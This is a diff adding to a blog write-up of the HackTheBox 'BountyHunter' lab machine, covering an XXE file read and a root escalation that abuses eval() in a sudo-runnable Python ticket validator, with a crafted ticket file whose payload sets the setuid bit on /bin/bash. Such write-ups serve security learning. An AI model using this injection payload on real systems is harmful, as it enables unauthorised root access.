@@ -1,3 +1,8 @@
+---
+layout: post
+title: HackTheBox BountyHunter Write-up
+---
+
 <h2>Overview</h2>
 
 BountyHunter is an easy-rated Linux machine on HackTheBox. It's running a website with an XML parser, which I can abuse with an XXE attack. In doing so, I'm able to read the contents of a
@@ -46,7 +51,7 @@ Following the link, I find a submission form for reporting bug bounties.
 
 I put in some test values and when submitted, the page returns the same values. Nothing too special appears to be happening.
 
-# INSERT BASIC TESTING SCREENSHOT HERE#
+![image](https://user-images.githubusercontent.com/44827973/144567274-7eca24fe-4792-43a6-8f09-f291413842b2.png)
 
 <h3>XXE attacks</h3>
 
@@ -163,3 +168,95 @@ It works! I'm able to read the user.txt file.
 
 ![image](https://user-images.githubusercontent.com/44827973/144561982-b75380fe-ee36-46b3-870c-a0f538393e40.png)
 
+<h2>Escalation to root</h2>
+
+<h3>Abusing sudo command</h3>
+
+The development user can run the following command as root:
+
+![image](https://user-images.githubusercontent.com/44827973/144562391-ad43eddc-42ae-41a7-8fe4-0676a4489599.png)
+
+The contents of ticketValidator.py:
+
+```
+development@bountyhunter:~$ cat /opt/skytrain_inc/ticketValidator.py
+#Skytrain Inc Ticket Validation System 0.1
+#Do not distribute this file.
+
+def load_file(loc):
+    if loc.endswith(".md"):
+        return open(loc, 'r')
+    else:
+        print("Wrong file type.")
+        exit()
+
+def evaluate(ticketFile):
+    #Evaluates a ticket to check for ireggularities.
+    code_line = None
+    for i,x in enumerate(ticketFile.readlines()):
+        if i == 0:
+            if not x.startswith("# Skytrain Inc"):
+                return False
+            continue
+        if i == 1:
+            if not x.startswith("## Ticket to "):
+                return False
+            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
+            continue
+
+        if x.startswith("__Ticket Code:__"):
+            code_line = i+1
+            continue
+
+        if code_line and i == code_line:
+            if not x.startswith("**"):
+                return False
+            ticketCode = x.replace("**", "").split("+")[0]
+            if int(ticketCode) % 7 == 4:
+                validationNumber = eval(x.replace("**", ""))
+                if validationNumber > 100:
+                    return True
+                else:
+                    return False
+    return False
+
+def main():
+    fileName = input("Please enter the path to the ticket file.\n")
+    ticket = load_file(fileName)
+    #DEBUG print(ticket)
+    result = evaluate(ticket)
+    if (result):
+        print("Valid ticket.")
+    else:
+        print("Invalid ticket.")
+    ticket.close
+
+main()
+```
+
+The python script is a simple but fun riddle. Going through how it operates:
+
+1. It reads a given file input. If it doesn't have .md extension, the script exits.
+2. It then runs the script-defined function "evaluate", doing the following:
+	a. If the first line doesn't start with "# Skytrain Inc", the script exits.
+	b. If the second line doesn't start with "## Ticket to ", the script exits.
+	c. If any of the lines start with "__Ticket Code:__", it sets the variable `code_line` to the current line iteration + 1.
+	d. If on any line, code_line is set (not "None") and is equal to the current line iteration `i`, the script enters the dangerous code section.
+	e. The line must start with two asterisks, or the script exits.
+	f. The line has the double asterisks removed, and is split on the "+" character. The first split must equal 4 when the number modulo 7, otherwise script exits. Needless 	    to say, the first split should be an integer.
+	g. The script eval()'s the line with the double asterisks stripped.
+	h. If the return value of eval() of the line is <= 100, the script exits. *This doesn't actually matter, as we've already eval'd what we want to eval.* 
+
+I create an .md file to allow script execution until eval() is able to execute, adhering to the aforementioned rules. I've added a command to give /bin/bash setuid permissions.
+
+```
+development@bountyhunter:~$ cat hi.md
+# Skytrain Inc
+## Ticket to Harry Potter Museum
+__Ticket Code:__
+**704+__import__('os').system('chmod u+s /bin/bash')
+```
+
+I run the sudo command, specifying my .md file. I'm able to run /bin/bash and become root, and can read the contents of root.txt.
+
+![image](https://user-images.githubusercontent.com/44827973/144566990-f66afe93-1cd0-4346-8f4d-0180ffc61635.png)
